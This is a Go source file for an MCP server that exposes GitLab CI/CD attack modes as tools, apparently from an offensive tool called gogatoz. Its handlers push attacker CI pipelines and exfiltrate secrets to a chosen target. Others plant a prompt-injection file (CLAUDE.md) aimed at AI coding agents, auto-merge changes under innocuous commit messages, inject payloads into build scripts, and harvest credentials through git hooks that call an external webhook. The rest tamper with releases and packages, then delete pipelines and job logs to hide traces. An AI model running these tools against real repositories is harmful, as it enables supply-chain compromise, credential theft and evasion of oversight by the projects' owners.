package mcpserver

import (
	"context"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/mr-pmillz/gogatoz/pkg/attack"
	payloadgen "github.com/mr-pmillz/gogatoz/pkg/attack/payloads"
	"github.com/mr-pmillz/gogatoz/pkg/attack/ror"
	"github.com/mr-pmillz/gogatoz/pkg/attack/scriptinject"
	"github.com/mr-pmillz/gogatoz/pkg/attack/tamper"
	"github.com/mr-pmillz/gogatoz/pkg/pipeline"
	"github.com/mr-pmillz/gogatoz/pkg/pivot"
)

func (s *Server) handleDiscoverTags(ctx context.Context, input attackInput, out attackOutput) attackOutput {
	tags, runners, err := ror.DiscoverProjectRunnerTags(ctx, s.client, input.Target)
	if err != nil {
		out.Status = statusError
		out.Error = err.Error()
		return out
	}
	if executor := strings.TrimSpace(input.Executor); executor != "" {
		tags = ror.FilterTagsByExecutor(tags, executor)
	}
	out.Tags = tags
	out.Runners = make([]runnerOut, len(runners))
	for i, r := range runners {
		out.Runners[i] = runnerOut{
			ID:          r.ID,
			Description: r.Description,
			IsShared:    r.IsShared,
			RunnerType:  r.RunnerType,
			Tags:        r.Tags,
		}
	}
	return out
}

func (s *Server) handleCommitCI(ctx context.Context, att *attack.Attacker, input attackInput, out attackOutput) attackOutput {
	var tags []string
	if t := strings.TrimSpace(input.Tags); t != "" {
		for tag := range strings.SplitSeq(t, ",") {
			if v := strings.TrimSpace(tag); v != "" {
				tags = append(tags, v)
			}
		}
	}

	branch := strings.TrimSpace(input.Branch)
	if branch == "" {
		branch = attack.GogatozAttacks
	}

	finalBranch, err := deconflictBranch(ctx, att, input.Target, branch, input.Deconflict)
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("branch deconflict: %s", err)
		return out
	}
	out.Branch = finalBranch

	var yamlContent string
	payload := strings.ToLower(strings.TrimSpace(input.Payload))
	out.Payload = payload

	if raw := strings.TrimSpace(input.CIYAML); raw != "" {
		yamlContent = raw
		if payload == "" {
			out.Payload = "custom"
		}
	} else {
		yamlContent, err = renderPayload(payload, input, tags)
		if err != nil {
			out.Status = statusError
			out.Error = err.Error()
			return out
		}
	}

	msg := strings.TrimSpace(input.CommitMessage)
	pipelineRefURL, err := att.CommitCIPipeline(ctx, input.Target, finalBranch, yamlContent, msg)
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("commit ci: %s", err)
		return out
	}
	out.PipelineURL = pipelineRefURL
	out.Tags = tags

	s.waitAndLogPipeline(ctx, input, &out, finalBranch)
	return out
}

func (s *Server) handleSecrets(ctx context.Context, att *attack.Attacker, input attackInput, out attackOutput) attackOutput {
	branch := strings.TrimSpace(input.Branch)
	if branch == "" {
		branch = attack.GogatozAttacks
	}
	finalBranch, err := deconflictBranch(ctx, att, input.Target, branch, input.Deconflict)
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("branch deconflict: %s", err)
		return out
	}
	out.Branch = finalBranch
	out.Payload = payloadSecrets

	var tags []string
	if t := strings.TrimSpace(input.Tags); t != "" {
		for tag := range strings.SplitSeq(t, ",") {
			if v := strings.TrimSpace(tag); v != "" {
				tags = append(tags, v)
			}
		}
	}
	out.Tags = tags

	sa := attack.NewSecretsAttack(att)
	exfil := attack.ExfilOptions{
		Method: input.ExfilMethod,
		Target: input.ExfilTarget,
	}
	pipelineRefURL, _, err := sa.RunExfil(ctx, input.Target, finalBranch, "", tags, exfil)
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("secrets exfil: %s", err)
		return out
	}
	out.PipelineURL = pipelineRefURL

	s.waitAndLogPipeline(ctx, input, &out, finalBranch)
	return out
}

func (s *Server) handleAIInject(ctx context.Context, att *attack.Attacker, input attackInput, out attackOutput) attackOutput {
	branch := strings.TrimSpace(input.Branch)
	if branch == "" {
		branch = attack.GogatozAttacks
	}
	finalBranch, err := deconflictBranch(ctx, att, input.Target, branch, input.Deconflict)
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("branch deconflict: %s", err)
		return out
	}
	out.Branch = finalBranch
	out.Payload = "ai_inject"

	prompt := strings.TrimSpace(input.AIPrompt)
	if prompt == "" {
		prompt = payloadgen.DefaultAIInjectionPrompt()
	}
	configFile := strings.TrimSpace(input.AIConfigFile)
	if configFile == "" {
		configFile = "CLAUDE.md"
	}
	out.ConfigFile = configFile

	if err := att.EnsureBranch(ctx, input.Target, finalBranch); err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("ensure branch: %s", err)
		return out
	}
	msg := strings.TrimSpace(input.CommitMessage)
	if msg == "" {
		msg = "Update " + configFile
	}
	if err := att.UpsertFile(ctx, input.Target, finalBranch, configFile, prompt, msg); err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("upsert file: %s", err)
		return out
	}
	fmt.Fprintf(os.Stderr, "[attack] committed %s to branch %s\n", configFile, finalBranch)

	if input.CreateMR {
		title := strings.TrimSpace(input.MRTitle)
		if title == "" {
			title = "Update " + configFile
		}
		mr, mrErr := att.CreateMergeRequest(ctx, input.Target, finalBranch,
			strings.TrimSpace(input.MRTargetBranch), title, strings.TrimSpace(input.MRDescription))
		if mrErr != nil {
			out.Status = statusError
			out.Error = fmt.Sprintf("create merge request: %s", mrErr)
			return out
		}
		out.MergeRequestURL = mr.WebURL
		out.MergeRequestIID = mr.IID
		fmt.Fprintf(os.Stderr, "[attack] merge request: %s\n", mr.WebURL)
	}

	return out
}

func (s *Server) handleAutoMerge(ctx context.Context, att *attack.Attacker, input attackInput, out attackOutput) attackOutput {
	pers := attack.NewPersistence(att)

	filePath := strings.TrimSpace(input.AutoMergeFile)
	if filePath == "" {
		filePath = ".gitlab-ci.yml"
	}

	var content string
	if raw := strings.TrimSpace(input.CIYAML); raw != "" {
		content = raw
	} else if p := strings.TrimSpace(input.Payload); p != "" {
		tags := parseTags(input.Tags)
		var err error
		content, err = renderPayload(p, input, tags)
		if err != nil {
			out.Status = statusError
			out.Error = err.Error()
			return out
		}
	}
	if content == "" {
		out.Status = statusError
		out.Error = "provide content via ci_yaml or payload for auto_merge mode"
		return out
	}

	branch := strings.TrimSpace(input.Branch)
	if branch == "" {
		branch = attack.GogatozAttacks
	}
	finalBranch, err := deconflictBranch(ctx, att, input.Target, branch, input.Deconflict)
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("branch deconflict: %s", err)
		return out
	}
	out.Branch = finalBranch

	msg := strings.TrimSpace(input.CommitMessage)
	if msg == "" {
		msg = "chore: update configuration"
	}
	mrTitle := strings.TrimSpace(input.MRTitle)
	if mrTitle == "" {
		mrTitle = "Update project configuration"
	}

	result, mergeErr := pers.RunAutoMerge(ctx, input.Target,
		finalBranch, filePath, content, msg,
		mrTitle, input.MRDescription, input.MRTargetBranch)
	if mergeErr != nil && result == nil {
		out.Status = statusError
		out.Error = mergeErr.Error()
		return out
	}

	out.MergeRequestURL = result.MRURL
	out.MergeRequestIID = result.MRIID
	out.Approved = result.Approved
	out.Merged = result.Merged
	if result.ApproveErr != "" {
		out.Error = "approve: " + result.ApproveErr
	}
	if result.MergeErr != "" {
		if out.Error != "" {
			out.Error += "; "
		}
		out.Error += "merge: " + result.MergeErr
	}
	if !result.Merged && out.Error != "" {
		out.Status = statusError
	}
	return out
}

func (s *Server) handleInjectScript(ctx context.Context, att *attack.Attacker, input attackInput, out attackOutput) attackOutput {
	payload := strings.TrimSpace(input.ScriptPayload)
	if payload == "" {
		out.Status = statusError
		out.Error = "script_payload is required for inject_script mode"
		return out
	}

	scriptPath := strings.TrimSpace(input.ScriptPath)
	if scriptPath == "" {
		content, err := att.GetFileContent(ctx, input.Target, "", ".gitlab-ci.yml")
		if err != nil {
			out.Status = statusError
			out.Error = fmt.Sprintf("fetch .gitlab-ci.yml for script detection: %s", err)
			return out
		}
		doc, err := pipeline.Parse(strings.NewReader(content))
		if err != nil {
			out.Status = statusError
			out.Error = fmt.Sprintf("parse .gitlab-ci.yml: %s", err)
			return out
		}
		refs := scriptinject.ExtractScriptRefs(doc)
		if len(refs) == 0 {
			out.Status = statusError
			out.Error = "no external script references found in .gitlab-ci.yml; specify script_path"
			return out
		}
		scriptPath = refs[0].Path
		fmt.Fprintf(os.Stderr, "[attack] auto-detected script: %s (from job %q)\n", scriptPath, refs[0].JobName)
	}
	out.ScriptPath = scriptPath

	branch := strings.TrimSpace(input.Branch)
	if branch == "" {
		branch = attack.GogatozAttacks
	}
	finalBranch, err := deconflictBranch(ctx, att, input.Target, branch, input.Deconflict)
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("branch deconflict: %s", err)
		return out
	}
	out.Branch = finalBranch

	if err := att.EnsureBranch(ctx, input.Target, finalBranch); err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("ensure branch: %s", err)
		return out
	}

	original, err := att.GetFileContent(ctx, input.Target, finalBranch, scriptPath)
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("fetch %s: %s", scriptPath, err)
		return out
	}

	var modified string
	if input.ScriptPrepend {
		modified = scriptinject.PrependPayload(original, payload)
	} else {
		modified = scriptinject.AppendPayload(original, payload)
	}

	msg := strings.TrimSpace(input.CommitMessage)
	if msg == "" {
		msg = "Update " + scriptPath
	}
	if err := att.UpsertFile(ctx, input.Target, finalBranch, scriptPath, modified, msg); err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("commit injected script: %s", err)
		return out
	}
	fmt.Fprintf(os.Stderr, "[attack] injected payload into %s on branch %s\n", scriptPath, finalBranch)
	return out
}

func (s *Server) handleHarvest(ctx context.Context, att *attack.Attacker, input attackInput, out attackOutput) attackOutput {
	webhook := strings.TrimSpace(input.Webhook)
	if webhook == "" {
		out.Status = statusError
		out.Error = "webhook is required for harvest mode (external URL reachable from runners)"
		return out
	}

	tags := parseTags(input.Tags)
	hookYAML := payloadgen.GenerateGitHookYAML(payloadgen.GitHookOptions{
		Common: payloadgen.CommonOptions{
			Tags: tags,
		},
		CallbackURL: webhook,
		HookType:    strings.TrimSpace(input.HookType),
	})

	branch := strings.TrimSpace(input.Branch)
	if branch == "" {
		branch = attack.GogatozAttacks
	}
	pipelineURL, err := att.CommitCIPipeline(ctx, input.Target, branch, hookYAML, "Install CI hook via GoGatoZ")
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("commit git-hook payload: %s", err)
		return out
	}
	out.PipelineURL = pipelineURL
	out.Branch = branch
	out.Tags = tags
	fmt.Fprintf(os.Stderr, "[harvest] git-hook payload committed: %s\n", pipelineURL)

	harvestTimeout := 30 * time.Minute
	if t := strings.TrimSpace(input.HarvestTimeout); t != "" {
		if d, err := time.ParseDuration(t); err == nil {
			harvestTimeout = d
		}
	}
	listenAddr := strings.TrimSpace(input.ListenAddr)
	if listenAddr == "" {
		listenAddr = pivot.DefaultListenAddr
	}

	h := pivot.NewHarvester(pivot.HarvestOptions{
		ListenAddr: listenAddr,
		GitLabURL:  s.gitlabURL,
		Timeout:    harvestTimeout,
		Progress: func(e pivot.HarvestEvent) {
			fmt.Fprintf(os.Stderr, "[harvest] %s: %s\n", e.Type, e.Message)
		},
	})

	result, err := h.Run(ctx)
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("harvest: %s", err)
		return out
	}
	out.Callbacks = result.Callbacks
	out.Credentials = len(result.Credentials)
	return out
}

func (s *Server) handleTamperRelease(ctx context.Context, input attackInput, out attackOutput) attackOutput {
	tagName := strings.TrimSpace(input.TagName)
	if tagName == "" {
		out.Status = statusError
		out.Error = "tag_name is required for tamper_release mode"
		return out
	}

	opts := tamper.TamperReleaseOptions{
		NewName:        strings.TrimSpace(input.ReleaseName),
		NewDescription: strings.TrimSpace(input.ReleaseDesc),
	}
	if ln := strings.TrimSpace(input.LinkName); ln != "" && strings.TrimSpace(input.LinkURL) != "" {
		opts.ReplaceLinks = map[string]string{ln: strings.TrimSpace(input.LinkURL)}
	}
	if an := strings.TrimSpace(input.AddLinkName); an != "" && strings.TrimSpace(input.AddLinkURL) != "" {
		opts.AddLinks = map[string]string{an: strings.TrimSpace(input.AddLinkURL)}
	}

	replaced, added, err := tamper.TamperRelease(ctx, s.client, input.Target, tagName, opts)
	if err != nil {
		out.Status = statusError
		out.Error = err.Error()
		return out
	}
	out.LinksReplaced = replaced
	out.LinksAdded = added
	return out
}

func (s *Server) handleTamperPackage(ctx context.Context, input attackInput, out attackOutput) attackOutput {
	pkgName := strings.TrimSpace(input.PackageName)
	pkgVer := strings.TrimSpace(input.PackageVersion)
	pkgFile := strings.TrimSpace(input.PackageFile)
	if pkgName == "" || pkgVer == "" || pkgFile == "" {
		out.Status = statusError
		out.Error = "package_name, package_version, and package_file are required for tamper_package"
		return out
	}

	f, err := os.Open(pkgFile) //nolint:gosec // file path provided by MCP caller
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("open package_file: %s", err)
		return out
	}
	defer f.Close()

	fi, err := f.Stat()
	if err != nil {
		out.Status = statusError
		out.Error = fmt.Sprintf("stat package_file: %s", err)
		return out
	}

	result, err := tamper.PublishPackage(ctx, s.client, input.Target, pkgName, pkgVer, fi.Name(), f)
	if err != nil {
		out.Status = statusError
		out.Error = err.Error()
		return out
	}
	out.PackageURL = result.URL
	return out
}

func (s *Server) handleCleanupTraces(ctx context.Context, att *attack.Attacker, input attackInput, out attackOutput) attackOutput {
	if pidStr := strings.TrimSpace(input.PipelineIDStr); pidStr != "" {
		pid, err := strconv.ParseInt(pidStr, 10, 64)
		if err != nil {
			out.Status = statusError
			out.Error = fmt.Sprintf("invalid pipeline_id: %s", err)
			return out
		}
		if err := att.DeletePipeline(ctx, input.Target, pid); err != nil {
			out.Status = statusError
			out.Error = fmt.Sprintf("delete pipeline: %s", err)
			return out
		}
		fmt.Fprintf(os.Stderr, "[cleanup] deleted pipeline %d\n", pid)
		return out
	}

	if input.CleanupJobs {
		maxPipelines := input.CleanupJobsMax
		if maxPipelines <= 0 {
			maxPipelines = 5
		}
		erased, err := att.EraseRecentPipelines(ctx, input.Target,
			strings.TrimSpace(input.CleanupJobsRef), maxPipelines, false)
		if err != nil {
			out.Status = statusError
			out.Error = fmt.Sprintf("erase job traces: %s", err)
			return out
		}
		out.JobsErased = erased
		fmt.Fprintf(os.Stderr, "[cleanup] erased %d job traces\n", erased)
		return out
	}

	out.Status = statusError
	out.Error = "specify pipeline_id or set cleanup_jobs for cleanup_traces mode"
	return out
}
